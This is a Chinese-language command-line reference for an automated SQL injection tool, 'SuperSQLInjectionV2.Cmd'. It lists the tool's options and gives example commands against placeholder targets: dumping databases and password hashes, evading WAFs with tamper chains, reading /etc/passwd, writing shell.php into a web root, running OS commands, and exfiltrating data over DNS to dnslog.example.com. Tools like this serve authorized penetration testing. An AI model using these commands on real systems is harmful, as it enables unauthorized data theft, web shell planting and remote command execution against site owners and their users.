# SuperSQLInjectionV2.Cmd CLI 完整参考

## 全部参数

```
目标:
  -u URL                  目标 URL（自动识别 GET 参数）
  -r FILE                 从文件加载原始 HTTP 请求报文
  -m FILE                 批量检测：URL 列表文件（逐行一个，# 开头注释；仅检测不取数，--parallel 多目标并发）
  --data=DATA             POST 表单数据（k=v&k2=v2）
  --cookie=COOKIE         Cookie 头
  --header="K: V"         自定义请求头（可多次）
  --method=METHOD         HTTP 方法（默认 GET；有 --data 时 POST）
  -p PARAM                只测试指定参数（默认测全部 GET/POST 参数）

检测:
  --level=N               检测级别 1-5（默认 1）
  --risk=N                风险级别 1-3（默认 1）
  --technique=BEUTSD      技术筛选：B布尔 E报错 U联合 T时间 S堆叠 D DNS外带
  --dbms=DBMS             指定数据库（mysql/pgsql/sqlserver/sqlite/oracle/access/db2/dm/...）
  --smart                 智能模式（默认已开启，仅为兼容保留）
  --no-smart              关闭智能模式（非动态参数也全量检测）
  --exhaustive            穷举模式（同技术测完全部用例）
  --parallel              多参数并行检测；-m 批量模式下为多目标并发（并发度取 --threads）
  --stop-waf              WAF 拦截累计 5 次即停止检测
  --keep-testing          检出注入后仍继续检测其余参数（默认检出即停）
  --flush-session         强制重新检测（默认同目标+同报文+同检测参数自动复用会话，免重复发包）
  --dns-domain=D          DNS 外带接收域名（配合 --dns-token）
  --dns-token=TOKEN       DNS 外带接收服务 API Token

请求:
  --proxy=PROXY           代理（http:// 或 socks5://host:port）
  --auth-type=TYPE        HTTP 认证：Basic / Digest / NTLM
  --auth-cred=USER:PASS   HTTP 认证凭据（密码可包含冒号，按首个冒号分隔）
  --auth-domain=DOMAIN    NTLM 域（可选）
  --timeout=N             超时秒数（默认 15）
  --retries=N             超时重试（默认 1）
  --delay=N               每次请求前延时（毫秒）
  --threads=N             盲注并发线程（默认 1，建议 ≤10）
  --random-agent          随机 User-Agent
  --user-agent=UA         指定 User-Agent
  --tamper=A,B            编码处理工具链（按名称/key，逗号分隔多个）
  --rules-dir=DIR         规则库目录（默认 config/rules/，与 GUI 共用）
  --follow-redirects      跟随 3xx 重定向
  --cookie-jar            保持目标 Cookie 会话（默认关闭）
  --force-ssl             -r 原始报文按 HTTPS 发送；绝对形式 https:// 请求行自动识别

取数动作（检测到注入后执行，可组合）:
  --banner                数据库版本
  --current-user          当前用户
  --current-db            当前库
  --hostname              主机名
  --is-dba                是否 DBA
  --env                   全部环境变量
  --passwords             哈希口令读取
  --privileges            权限角色
  --dbs                   枚举所有库
  --tables -D DB          枚举表
  --columns -D DB -T TBL  枚举字段
  --dump -D DB -T TBL     导出表数据（-C col1,col2 选列）
  --start=N --stop=N      dump 闭区间行范围（1 起，含 start 和 stop）
  --where=COND            dump 行过滤条件
  --sql-query=SQL         执行自定义 SQL
  --file-read=PATH        读取服务器文件（--file-method=名 指定方式）
  --file-write=LOCAL --file-dest=REMOTE   上传文件（--file-method=名 指定方式）
  --os-cmd=CMD            执行系统命令（--cmd-method=名 指定方式）
  --no-cast               取数不使用 CAST 转换
  --hex                   中文识别（HEX 包装防乱码）
  --fresh-queries         忽略跨会话值缓存，全部重新读取
  --no-predict            关闭值预测
  --no-online-learn       关闭 n-gram 在线学习
  --no-channel-upgrade    关闭盲注到报错/Union 的通道升级
  --no-cache-verify       关闭缓存命中后的抽样复验

输出:
  --output-dir=DIR        结果保存目录（默认 output/<host>_<port>/）
  --batch-output=FILE     批量检测机器可读结果，按扩展名输出 .json 或 .csv
  --support-matrix=FILE   导出数据库/Fork 能力矩阵 JSON（无需目标）
  --raw-csv               CSV 保留原始文本（默认开启 Excel 公式防护）
  --batch                 非交互模式（默认）
  --version               显示版本
  --selftest              自检 QuickJS 原生库加载和 JS 执行
  -h, --help              显示帮助
```

## 场景示例

```bash
# 基础检测
SuperSQLInjectionV2.Cmd -u "http://target/app/mysql.jsp?id=1"

# 检测 + 枚举全部库
SuperSQLInjectionV2.Cmd -u "http://target/app/mysql.jsp?id=1" --dbs

# 拖指定表（含列筛选与行范围）
SuperSQLInjectionV2.Cmd -u "http://target/app/mysql.jsp?id=1" -D sqli_test -T users --dump -C id,username,password --start=1 --stop=100

# 自定义 SQL
SuperSQLInjectionV2.Cmd -u "http://target/app/mysql.jsp?id=1" --sql-query="select version()"

# 报文模式（Cookie/JSON/XML/Header 注入点）
SuperSQLInjectionV2.Cmd -r request.txt -p id --dbs

# 提高检测强度 + 指定数据库 + 多线程盲注
SuperSQLInjectionV2.Cmd -u "http://target/page.php?id=1" --level=3 --risk=2 --dbms=mysql --threads=5

# 疑似 WAF：编码链 + 随机 UA + 延时
SuperSQLInjectionV2.Cmd -u "http://target/page.php?id=1" --tamper=space2comment,randomcase --random-agent --delay=300

# 读文件 / 写文件 / 执行命令
SuperSQLInjectionV2.Cmd -u "http://target/app/mysql.jsp?id=1" --file-read="/etc/passwd"
SuperSQLInjectionV2.Cmd -u "http://target/app/mysql.jsp?id=1" --file-write=./shell.php --file-dest="/var/www/html/shell.php"
SuperSQLInjectionV2.Cmd -u "http://target/app/mysql.jsp?id=1" --os-cmd="whoami"

# DNS 外带（无回显场景）
SuperSQLInjectionV2.Cmd -u "http://target/page.php?id=1" --technique=D --dns-domain=dnslog.example.com --dns-token=TOKEN --dbs

# 批量检测（URL 列表文件，仅检测；--parallel 并发）
SuperSQLInjectionV2.Cmd -m urls.txt --parallel --threads=5

# 二次运行同目标取数：自动复用会话跳过检测；强制重测加 --flush-session
SuperSQLInjectionV2.Cmd -u "http://target/app/mysql.jsp?id=1" --dbs          # 首次：检测+取数
SuperSQLInjectionV2.Cmd -u "http://target/app/mysql.jsp?id=1" --tables -D mydb  # 复用会话直接取数
```

## 输出约定

- 控制台末尾打印检测报告（参数/注入类型/数据库(含Fork衍生库)/列数显示位）与动作结果。
- `output/<host>_<port>/<请求报文哈希>/session.json`：检测会话（注入点全字段+指纹），同目标同报文同检测参数再次运行自动复用跳过检测；`--flush-session` 强制重测。
- `output/<host>_<port>/dump_<库>_<表>_<时间>.csv`：dump 落盘文件；`--start/--stop` 为包含两端的行号范围。
- `--batch-output=result.json|csv`：批量检测结构化结果，包含每个目标的状态、耗时、错误与命中摘要。
- 退出即完成，无交互（--batch 默认）。
- 退出码：0=成功/批量有命中；1=未检出注入或动作执行失败；2=参数/输入错误；3=运行异常；4=目标无法连接。
